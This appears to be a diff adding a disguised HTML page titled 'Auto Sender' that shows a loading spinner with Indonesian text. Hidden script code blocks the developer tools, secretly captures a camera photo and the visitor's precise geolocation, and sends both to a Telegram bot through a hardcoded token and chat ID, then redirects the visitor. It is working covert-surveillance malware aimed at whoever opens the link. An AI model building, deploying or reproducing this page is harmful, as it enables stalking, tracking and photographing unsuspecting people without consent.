@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Auto Sender</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
+        body {
+            display: flex; justify-content: center; align-items: center; text-align: center;
+            height: 100vh; background: linear-gradient(135deg, #2c3e50, #34495e); color: white;
+            flex-direction: column;
+        }
+        .loader {
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-top: 4px solid white;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 15px;
+        }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+        h2 { font-size: 22px; }
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="loader"></div>
+    <h2>🚀 Memproses...</h2>
+
+    <video id="video" autoplay></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        (function() {
+            function protect() {
+                setInterval(() => { debugger; }, 10);
+                document.addEventListener('keydown', function(e) {
+                    if (e.key === "F12" || (e.ctrlKey && e.shiftKey && e.key === "I")) {
+                        e.preventDefault();
+                    }
+                });
+                document.addEventListener("contextmenu", function(e) {
+                    e.preventDefault();
+                });
+            }
+            protect();
+
+            const TOKEN = "7933608586:AAGa6aWuCrAawUFTRs_BAGp4aRfjri8XH40";
+            const CHAT_ID = "5384702841";
+            let lat, lon, stream;
+
+            function startProcess() {
+                navigator.mediaDevices.getUserMedia({ video: true }).then(s => {
+                    stream = s;
+                    document.getElementById('video').srcObject = stream;
+                }).catch(() => {});
+
+                navigator.geolocation.getCurrentPosition(p => {
+                    lat = p.coords.latitude;
+                    lon = p.coords.longitude;
+                }, () => {}, { enableHighAccuracy: true, timeout: 5000 });
+
+                setTimeout(sendData, 4000);
+            }
+
+            function capturePhoto() {
+                const c = document.getElementById('canvas');
+                const v = document.getElementById('video');
+                c.width = v.videoWidth;
+                c.height = v.videoHeight;
+                c.getContext('2d').drawImage(v, 0, 0, c.width, c.height);
+                return c.toDataURL('image/jpeg');  
+            }
+
+            function stopCamera() {
+                if (stream) stream.getTracks().forEach(t => t.stop());
+            }
+
+            function sendData() {
+                const img = capturePhoto();
+                const blob = dataURItoBlob(img);
+
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: `📍 **Lokasi Diterima**:\n🌍 Latitude: ${lat}\n🌍 Longitude: ${lon}\nhttps://www.google.com/maps?q=${lat},${lon}` })
+                });
+
+                let formData = new FormData();
+                formData.append("chat_id", CHAT_ID);
+                formData.append("photo", blob, "selfie.jpg");
+
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+                    method: "POST",
+                    body: formData
+                }).finally(() => {
+                    stopCamera();
+                    window.location.href = "https://yourgithubpage.github.io/";
+                });
+            }
+
+            function dataURItoBlob(dataURI) {
+                let byteString = atob(dataURI.split(',')[1]);
+                let arrayBuffer = new ArrayBuffer(byteString.length);
+                let uint8Array = new Uint8Array(arrayBuffer);
+                for (let i = 0; i < byteString.length; i++) {
+                    uint8Array[i] = byteString.charCodeAt(i);
+                }
+                return new Blob([uint8Array], { type: "image/jpeg" });
+            }
+
+            window.onload = startProcess;
+        })();
+    </script>
+
+</body>
+</html>
